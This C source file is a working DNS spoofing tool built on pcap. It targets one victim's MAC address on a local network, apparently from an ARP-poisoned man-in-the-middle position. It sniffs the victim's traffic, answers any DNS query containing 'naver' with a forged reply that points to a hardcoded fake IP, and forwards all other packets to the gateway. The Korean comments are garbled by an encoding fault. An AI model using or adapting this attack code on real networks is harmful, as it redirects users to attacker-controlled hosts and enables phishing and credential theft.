#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <pcap.h>
#include <stdio.h>


#define MAC_ADDR_LEN 6
#define IP_ADDR_LEN 4
#define BUF_SIZE 100
#define SNAPLEN 65536
#define ARP_HEADER_JMP 14
#define IP_HEADER_JMP 14
#define TCP_HEADER_JMP 20
#define DATA_JMP 20
#define CARRY 65536
#define TRUE 1
#define FALSE 0
pcap_t *use_dev;

//�̴��� ���
#pragma pack(push, 1)
struct ethernet_header {
	unsigned char eth_dst_mac[MAC_ADDR_LEN];
	unsigned char eth_src_mac[MAC_ADDR_LEN];
	unsigned short eth_type;
};
#pragma pack(pop)

//IP ���
#pragma pack(push, 1)
struct ip_header {
	unsigned char ip_version : 4; // ipv4
	unsigned char ip_header_len : 4; //Header Length
	unsigned char ip_tos;//Type of Service
	unsigned short ip_total_len;//Total Length
	unsigned short ip_id;
	unsigned short flags;
	unsigned char ip_TTL;
	unsigned char ip_protocol;
	unsigned short ip_checksum;
	unsigned char ip_src_addr[IP_ADDR_LEN];
	unsigned char ip_dst_addr[IP_ADDR_LEN];
	//20 bytes
};
#pragma pack(pop)

#pragma pack(push,1)
struct udp_header {
	unsigned short udp_src_port;
	unsigned short udp_dst_port;
	unsigned short udp_len;
	unsigned short udp_checksum;
	//8 bytes
};
#pragma pack(pop)
//DNS ���
#pragma pack(push, 1)
struct dns_header {
	unsigned short id;
	unsigned short dns_flags;
	//�޼����� ����(0)���� ����(1)���� ����
	unsigned short qst_count;
	unsigned short ans_count;
	unsigned short auth_num;
	unsigned short add_num;
};
#pragma pack(pop)
#pragma pack(push, 1)
struct dns_query {
	unsigned short record_type;//Ŭ���̾�Ʈ�� ��û�ϴ� ���� ����
	unsigned short class;//dns�� ����ϴ� Ư����������
};
#pragma pack(pop)

#pragma pack(push, 1)
struct dns_response {
	unsigned short name;
	unsigned short record_type; //Ŭ���̾�Ʈ�� ��û�ϴ� ���� ����
	unsigned short class;
	unsigned long ttl;
	unsigned short rsc_data_len;
	unsigned char response_ip[IP_ADDR_LEN];//������..
};
#pragma pack(pop)



//main ����
int main(int argc, char **argv) {
	//��Ʈ��ũ ��ġ �ҷ���
	pcap_if_t *alldevs = NULL;
	pcap_if_t *dev;
	struct ethernet_header *eh;
	struct udp_header *uh;
	struct ip_header *ih;
	struct dns_header *dh;
	struct dns_query dq;
	struct dns_response dr;

	//ip checksum�� ����ϱ� ���� buffer

	//����
	unsigned char ATTACK_MAC[MAC_ADDR_LEN] = { 0x00,0xe0,0x4c,0x61,0xc8,0x1f };
	unsigned char GATEWAY_MAC[MAC_ADDR_LEN] = { 0x88,0x36,0x6c,0x7a,0x56,0x40 };
	unsigned char ATTACK_IP[IP_ADDR_LEN] = { 192,168,42,18 };
	unsigned char VICTIM_MAC[MAC_ADDR_LEN] = { 0xb0,0x6e,0xbf,0xc6,0xfa,0x45 };
	unsigned char FAKE_IP[IP_ADDR_LEN] = { 192,168,42,16 };

	//�����
	//unsigned char ATTACK_MAC[MAC_ADDR_LEN] = { 0x00,0xe0,0x4c,0x61,0xc8,0x1f };
	//unsigned char GATEWAY_MAC[MAC_ADDR_LEN] = { 0x00,0x01,0x36,0xf4,0x54,0x97 };
	//unsigned char ATTACK_IP[IP_ADDR_LEN] = { 192,168,25,15 };
	//unsigned char VICTIM_MAC[MAC_ADDR_LEN] = { 0x00,0x0c,0x29,0x18,0x38,0x4b };
	//unsigned char FAKE_IP[IP_ADDR_LEN] = { 192,168,42,16 };


	char errbuf[BUF_SIZE];
	char FILTER_RULE[BUF_SIZE] = "arp";
	//struct bpf_program rule_struct;
	int i, dev_num, res;
	struct pcap_pkthdr *header;
	const unsigned char *pkt_data;

	if (argv[1]) {
		strcpy(FILTER_RULE, "port ");
		strcat(FILTER_RULE, argv[1]);
	}

	if (pcap_findalldevs(&alldevs, errbuf) < 0) {
		printf("Device Find Error\n");
		return -1;
	}

	for (dev = alldevs, i = 0; dev != NULL; dev = dev->next) {
		printf("%d�� Device : %s (%s)\n", ++i, dev->name, dev->description);
	}
	printf("����� ����̽� ��ȣ �Է� : ");
	scanf("%d", &dev_num);

	for (dev = alldevs, i = 0; i < dev_num - 1; dev = dev->next, i++);

	if ((use_dev = pcap_open_live(dev->name, SNAPLEN, 1, 1000, errbuf)) == NULL) {
		printf("pcap_open ERROR!\n");
		pcap_freealldevs(alldevs);
		return -1;
	}
	printf("pcap_open ����!\n");
	// pcap_open success!



	//Packet Capture
	while (1) {
		//����ȯ
		res = pcap_next_ex(use_dev, &header, &pkt_data);
		if (res <= 0) continue;
		eh = (struct ethernet_header *)pkt_data;
		int Datapointer = sizeof(*eh);
		if (eh->eth_src_mac[0] == VICTIM_MAC[0]
			&& eh->eth_src_mac[1] == VICTIM_MAC[1]
			&& eh->eth_src_mac[2] == VICTIM_MAC[2]
			&& eh->eth_src_mac[3] == VICTIM_MAC[3]
			&& eh->eth_src_mac[4] == VICTIM_MAC[4]
			&& eh->eth_src_mac[5] == VICTIM_MAC[5]) {
			if (ntohs(eh->eth_type) == 0x0800) {
				ih = (struct  ip_header *)(pkt_data + Datapointer);
				Datapointer += sizeof(*ih);
				if (ih->ip_dst_addr[0] != ATTACK_IP[0] ||
					ih->ip_dst_addr[1] != ATTACK_IP[1] ||
					ih->ip_dst_addr[2] != ATTACK_IP[2] ||
					ih->ip_dst_addr[3] != ATTACK_IP[3])
				{
					if (ih->ip_protocol == 0x11) {
						uh = (struct udp_header *)(pkt_data + Datapointer);
						Datapointer += sizeof(*uh);
						if (ntohs(uh->udp_dst_port) == 53) {
							dh = (struct dns_header *)(pkt_data + Datapointer);
							Datapointer += sizeof(*dh);
							const unsigned char* name = pkt_data + Datapointer;
							Datapointer += strlen(name);

							if (strstr((char *)name, "naver"))
							{
								//backwarding	
								unsigned char temp[5000] = { 0 };
								//ethernet �ٲ�
								memcpy(eh->eth_src_mac, ATTACK_MAC, sizeof(eh->eth_src_mac));
								memcpy(eh->eth_dst_mac, VICTIM_MAC, sizeof(eh->eth_dst_mac));
								eh->eth_type = htons(0x0800);
								memcpy(temp, eh, sizeof(*eh));
								int b_datapointer = sizeof(*eh);
								printf("ethernet changed\n");


								//ip �ٲ�
								unsigned char temp_ip[IP_ADDR_LEN];
								memcpy(temp_ip, ih->ip_dst_addr, sizeof(ih->ip_dst_addr));
								memcpy(ih->ip_dst_addr, ih->ip_src_addr, sizeof(ih->ip_src_addr));
								memcpy(ih->ip_src_addr, temp_ip, sizeof(temp_ip));
								ih->ip_total_len = htons(sizeof(*ih) + sizeof(*uh) + sizeof(*dh) + strlen(name) + sizeof(dq) + sizeof(dr) + 1);
								memcpy(temp + b_datapointer, ih, sizeof(*ih));
								b_datapointer += sizeof(*ih);
								printf("ip changed \n");


								//udp �ٲ�
								unsigned short udp_temp_port;
								udp_temp_port = uh->udp_dst_port;
								uh->udp_dst_port = uh->udp_src_port;
								uh->udp_src_port = udp_temp_port;
								uh->udp_len = htons(sizeof(*uh) + sizeof(*dh) + strlen(name) + sizeof(dq) + sizeof(dr) + 1);
								memcpy(temp + b_datapointer, uh, sizeof(*uh));
								printf("udp changed \n");
								b_datapointer += sizeof(*uh);
								//dns �ٲ�


								dh->dns_flags = htons(0x8180);
								dh->qst_count = htons(0x0001);
								dh->ans_count = htons(0x0001);
								dh->auth_num = htons(0x0000);
								dh->add_num = htons(0x0000);
								memcpy(temp + b_datapointer, dh, sizeof(*dh));
								b_datapointer += sizeof(*dh);


								//name 
								strcat(temp + b_datapointer, name);
								b_datapointer += strlen(name);
								temp[b_datapointer++] = 0x00;
								dq.record_type = htons(0x0001);
								dq.class = htons(0x0001);
								memcpy(temp + b_datapointer, &dq, sizeof(dq));
								b_datapointer += sizeof(dq);

								dr.name = htons(0xc00c);
								dr.record_type = htons(0x0001);
								dr.class = htons(0x0001);
								dr.ttl = htonl(0x0000000e);
								dr.rsc_data_len = htons(0x0004);
								memcpy(dr.response_ip, FAKE_IP, sizeof(FAKE_IP));
								memcpy(temp + b_datapointer, &dr, sizeof(dr));
								b_datapointer += sizeof(dr);

								//��Ŷ����
								pcap_sendpacket(use_dev, temp, b_datapointer);
							}
							else {
								//forwarding
									//ethernet �ٲ�
								unsigned char temp[5000] = { 0 };
								memcpy(eh->eth_dst_mac, GATEWAY_MAC, sizeof(eh->eth_dst_mac));
								memcpy(eh->eth_src_mac, ATTACK_MAC, sizeof(eh->eth_src_mac));

								memcpy(temp, eh, sizeof(*eh));
								memcpy(temp + sizeof(*eh), pkt_data + sizeof(*eh), header->len - sizeof(*eh));

								pcap_sendpacket(use_dev, temp, header->len);
							}
						}
						else {
							unsigned char temp[5000] = { 0 };
							memcpy(eh->eth_dst_mac, GATEWAY_MAC, sizeof(eh->eth_dst_mac));
							memcpy(eh->eth_src_mac, ATTACK_MAC, sizeof(eh->eth_src_mac));

							memcpy(temp, eh, sizeof(*eh));
							memcpy(temp + sizeof(*eh), pkt_data + sizeof(*eh), header->len - sizeof(*eh));

							pcap_sendpacket(use_dev, temp, header->len);
						}
					}
					else {
						//forwarding
						unsigned char temp[5000] = { 0 };
						memcpy(eh->eth_dst_mac, GATEWAY_MAC, sizeof(eh->eth_dst_mac));
						memcpy(eh->eth_src_mac, ATTACK_MAC, sizeof(eh->eth_src_mac));

						memcpy(temp, eh, sizeof(*eh));
						memcpy(temp + sizeof(*eh), pkt_data + sizeof(*eh), header->len - sizeof(*eh));

						pcap_sendpacket(use_dev, temp, header->len);
					}
				}
			}
			else {
				unsigned char temp[5000] = { 0 };
				memcpy(eh->eth_dst_mac, GATEWAY_MAC, sizeof(eh->eth_dst_mac));
				memcpy(eh->eth_src_mac, ATTACK_MAC, sizeof(eh->eth_src_mac));

				memcpy(temp, eh, sizeof(*eh));
				memcpy(temp + sizeof(*eh), pkt_data + sizeof(*eh), header->len - sizeof(*eh));

				pcap_sendpacket(use_dev, temp, header->len);
			}

		}

	}
	return 0;
}
